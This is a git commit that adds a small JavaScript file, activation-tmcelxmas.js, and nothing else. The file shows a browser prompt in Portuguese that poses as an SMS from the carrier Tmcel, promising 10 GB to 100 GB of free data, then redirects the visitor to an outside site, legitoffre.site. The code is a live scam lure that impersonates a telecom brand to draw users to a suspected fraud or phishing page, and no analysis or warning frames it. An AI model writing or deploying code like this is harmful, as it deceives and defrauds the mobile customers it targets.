368043f4a95189a986f7c3de02d00ef3cd7da520
legitipz <gloliousam4@gmail.com>
2025-12-29 23:01:49 -0800

    Create activation-tmcelxmas.js

---
+++ activation-tmcelxmas.js
@@ -0,0 +1,6 @@
+
+var password = 'DADOS GRATUITOS'
+password=prompt('TMCEL SMS: Estimado cliente, por favor verifique se o seu cartão SIM Tmcel está qualificado para receber 10 GB a 100 GB de dados. Recompensa do cliente, clique em Dados grátis para verificar agora. ','DADOS GRATUITOS');
+if (password != 'DADOS GRATUITOS') {
+location.href='https://legitoffre.site/tmcelxmas.html';
+}
